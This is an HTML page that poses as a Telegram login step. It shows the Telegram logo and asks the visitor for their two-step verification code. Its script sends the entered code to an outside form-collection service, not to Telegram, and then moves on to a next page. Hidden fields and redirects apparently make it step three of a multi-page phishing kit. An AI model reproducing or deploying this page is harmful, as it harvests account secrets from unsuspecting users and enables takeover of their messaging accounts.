<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Two-Step Verification Code</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #0088cc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }
    .container {
      background-color: white;
      border-radius: 12px;
      padding: 30px;
      width: 90%;
      max-width: 320px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      text-align: center;
      position: relative;
      box-sizing: border-box;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 60px;
    }
    h3 {
      margin: 0 0 20px 0;
      font-size: 20px;
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
      box-sizing: border-box;
      direction: ltr;
      text-align: left;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #0088cc;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      position: relative;
      z-index: 1;
      box-sizing: border-box;
    }
    button:hover {
      background-color: #0075b6;
    }
    .loader {
      border: 4px solid rgba(0,0,0,0.1);
      border-left-color: #0088cc;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
      position: absolute;
      top: 50%;
      left: 50%;
      margin: -12px 0 0 -12px;
      display: none;
      z-index: 2;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    @media (max-width: 400px) {
      .container {
        padding: 20px;
        width: 95%;
      }
      .logo img {
        width: 50px;
      }
      input[type="text"], button {
        font-size: 14px;
        padding: 10px;
      }
      h3 {
        font-size: 18px;
        margin-bottom: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container" id="formContainer">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo" />
    </div>

    <h3>Enter your two-step verification code</h3>

    <form id="twoStepForm">
      <input type="hidden" name="formName" value="step3" />
      <input type="text" id="twoStepCode" name="twoStepCode" placeholder="Two-step verification code" required />
      <button type="submit" id="submitBtn">Submit</button>
      <div class="loader" id="loader"></div>
    </form>
  </div>

  <script>
    const form = document.getElementById('twoStepForm');
    const loader = document.getElementById('loader');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const code = document.getElementById('twoStepCode').value.trim();

      if (!code) {
        alert('Please enter your two-step verification code');
        return;
      }

      loader.style.display = 'block';
      submitBtn.disabled = true;
      submitBtn.style.cursor = 'not-allowed';

      fetch('https://formspree.io/f/xjkokdbr', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 
          formName: "step3",
          twoStepCode: code 
        })
      })
      .then(response => {
        if (response.ok) {
          window.location.href = 'index4.html'; // صفحه بعدی
        } else {
          alert('There was a problem sending your code, please try again.');
          loader.style.display = 'none';
          submitBtn.disabled = false;
          submitBtn.style.cursor = 'pointer';
        }
      })
      .catch(() => {
        alert('There was a problem sending your code, please try again.');
        loader.style.display = 'none';
        submitBtn.disabled = false;
        submitBtn.style.cursor = 'pointer';
      });
    });

    window.addEventListener('popstate', function(event) {
      window.location.href = 'index.html'; // صفحه اول
    });
  </script>
</body>
</html>
